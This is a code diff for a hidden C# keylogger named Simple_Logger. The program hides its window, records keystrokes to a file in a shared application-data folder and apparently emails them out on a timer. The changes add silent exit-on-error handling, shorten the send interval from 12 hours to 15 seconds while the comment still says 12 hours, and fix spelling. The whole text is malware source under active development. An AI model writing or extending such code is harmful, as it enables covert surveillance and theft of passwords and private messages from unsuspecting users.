@@ -20,21 +20,32 @@ namespace Simple_Logger
 
         private const int SW_HIDE = 0;
 
-        // Used to store key strokes
+        // Used to store keystrokes
 
         public static List<string> Keys = new List<string>();
 
-        // Initialize the directory used to store key strokes in
+        // Initialize the directory used to store keystrokes in
 
         private static string InitializeDirectory()
         {
             var folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Log Data");
-            Directory.CreateDirectory(folderPath);
+
+            try
+            {
+                Directory.CreateDirectory(folderPath);
+            }
+
+            catch
+            {
+                // If a directory cannot be created terminate the instance
+
+                Environment.Exit(0);
+            }
 
             return folderPath;
         }
 
-        // Initialize the file used to store key strokes for the session
+        // Initialize the file used to store keystrokes for the session
         
         private static string InitializeLogFile()
         {
@@ -63,7 +74,7 @@ namespace Simple_Logger
             return filePath;
         }
 
-        // Start logging key strokes
+        // Start logging keystrokes
 
         public static void Main()
         {
@@ -83,7 +94,7 @@ namespace Simple_Logger
 
             // Send an email every 12 hours
 
-            Observable.Interval(TimeSpan.FromHours(12)).Subscribe(x =>
+            Observable.Interval(TimeSpan.FromSeconds(15)).Subscribe(x =>
             {
                 // Read keystrokes from file
 
@@ -101,7 +112,7 @@ namespace Simple_Logger
 
         }
 
-        // Write key strokes to file
+        // Write keystrokes to file
 
         private static void WriteToFile(string filePath)
         {
@@ -112,14 +123,24 @@ namespace Simple_Logger
                 keystrokes.AppendLine(key);
             }
 
-            File.WriteAllText(filePath, keystrokes.ToString());
+            try
+            {
+                File.WriteAllText(filePath, keystrokes.ToString());
+            }
+
+            catch
+            {
+                // If keystrokes cannot be written to file terminate the session
+
+                Environment.Exit(0);
+            }
 
             // Remove keystrokes that have been written to file from storage
 
             Keys.Clear();
         }
 
-        // Read key strokes from file
+        // Read keystrokes from file
 
         private static string ReadFromFile(string filePath)
         {
